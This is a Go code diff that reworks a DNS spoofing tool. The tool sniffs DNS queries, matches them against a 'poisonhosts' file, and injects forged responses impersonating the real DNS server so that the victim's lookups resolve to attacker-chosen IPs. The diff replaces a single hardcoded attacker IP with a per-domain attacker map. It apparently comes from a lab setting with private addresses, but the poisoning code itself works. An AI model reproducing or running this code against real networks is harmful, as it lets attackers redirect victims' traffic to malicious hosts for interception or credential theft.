@@ -61,7 +61,7 @@ func stringInSlice(a string, list []string) bool {
 }
 
 
-func captureLiveTraffic(interfaceName string, bpfFilter string, hostnames []string, targetips []string){
+func captureLiveTraffic(interfaceName string, bpfFilter string, attacker map[string]string){
 	var (
 		device       string = ""
 		snapshot_len int32  = 1024
@@ -114,6 +114,11 @@ func captureLiveTraffic(interfaceName string, bpfFilter string, hostnames []stri
 		}
 
 		err = parser.DecodeLayers(data, &decodedLayers)
+		hostnames := make([]string, 0, len(attacker))
+	    for hostname, _ := range attacker {
+	        hostnames = append(hostnames, hostname)
+	    }
+
 		for _, typ := range decodedLayers {
 			switch typ {
 				case layers.LayerTypeUDP:
@@ -128,7 +133,7 @@ func captureLiveTraffic(interfaceName string, bpfFilter string, hostnames []stri
 					for _, dnsQuestion := range dns.Questions {
 						domain := string(dnsQuestion.Name)
 						if(stringInSlice(domain, hostnames)){
-							sendTraffic(dnsId, VicIP, VicPort, DnsServerIP, domain)
+							sendDnsPacket(dnsId, VicIP, VicPort, DnsServerIP, domain, attacker[domain])
 						}
 					}
 				}
@@ -136,23 +141,22 @@ func captureLiveTraffic(interfaceName string, bpfFilter string, hostnames []stri
 		}
 }
 
-func sendTraffic(tId int, vicIp string, vicPort string, vicDns string, dnsQn string){	
+func sendDnsPacket(dnsId int, vicIp string, vicPort string, orgDnsServerIp string, domain_name string, attacker_ip string){	
 	handle, err = pcap.OpenLive(intface, 1024, true, pcap.BlockForever)
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer handle.Close()
 
-	// Create ethernet layer
 	eth := layers.Ethernet{
 		SrcMAC:       net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
 		DstMAC:       net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
 		EthernetType: layers.EthernetTypeIPv4,
 	}
 
-	sourceIP := net.ParseIP(vicDns)
+	sourceIP := net.ParseIP(orgDnsServerIp)
 	destinationIP := net.ParseIP(vicIp)
-	// Create ip layer
+
 	ip := layers.IPv4{
 		Version:  4,
 		TTL:      64,
@@ -170,16 +174,16 @@ func sendTraffic(tId int, vicIp string, vicPort string, vicDns string, dnsQn str
 	}
 
 	udp.SetNetworkLayerForChecksum(&ip)
-	qnName := []byte(dnsQn)
+	qnName := []byte(domain_name)
 	qst := layers.DNSQuestion{
 		Name:  qnName,
 		Type:  layers.DNSTypeCNAME,
 		Class: layers.DNSClassIN,
 	}
-	transactionId := (uint16(tId))
-	attIp := "172.24.17.246"
-
-	attackerIp := net.ParseIP(attIp)
+	transactionId := (uint16(dnsId))
+	
+	fmt.Println(fmt.Sprintf("Attacker's ip being inserted: %s", attacker_ip))
+	attackerIp := net.ParseIP(attacker_ip)
 
 	ans := layers.DNSResourceRecord{
 		Name:  qnName,
@@ -231,34 +235,34 @@ func sendTraffic(tId int, vicIp string, vicPort string, vicDns string, dnsQn str
 func main(){
 	commandLineArgs := os.Args
 	if len(commandLineArgs) == 0 {
-		fmt.Println("Usage:\nsudo go run [-i interface] [-f filename]")
+		fmt.Println("Usage:\nsudo go run [-i interface] [-r pcap] [-f filename]")
 		fmt.Println("-i flag expects interface name")
+		fmt.Println("-r flag expects pcap name")
+		fmt.Println("-f flag expects filename")
 	} else {
 		data, err := ioutil.ReadFile("poisonhosts")
   		if err != nil {
     		fmt.Println("File reading error", err)
     		return
   		}
-  		content := string(data)
-  		lines := strings.Split(content, "\n")
-  		var hostnames []string
-  		var targetips []string
-
+  		lines := strings.Split(string(data), "\n")
+  		
+  		// every compromised domain will have an attacker ip
+  		attacker := make(map[string]string)
   		for index, element := range lines {
     		_ = index
-    		hostname_and_targetip := strings.Fields(element)
-    		if len(hostname_and_targetip) == 0{
+    		hostname_and_attackerip := strings.Fields(element)
+    		if len(hostname_and_attackerip) == 0{
     			break
     		}
-    		targetips = append(hostnames, hostname_and_targetip[0])
-    		hostnames = append(targetips, hostname_and_targetip[1])
-		}
+    		attacker_ip := hostname_and_attackerip[0]
+    		hostname := hostname_and_attackerip[1]
+    		attacker[hostname] = attacker_ip
+    	}
 		
-		fmt.Println(hostnames)
-		//fmt.Println("Victim's IP: 172.24.16.163")
-		//fmt.Println("Attacker's IP: 172.24.17.246")
 		interfaceName := "any"
 		bpfFilter := "udp"
-		captureLiveTraffic(interfaceName, bpfFilter, hostnames, targetips)
+		fmt.Println(attacker)
+		captureLiveTraffic(interfaceName, bpfFilter, attacker)
 	}
 }
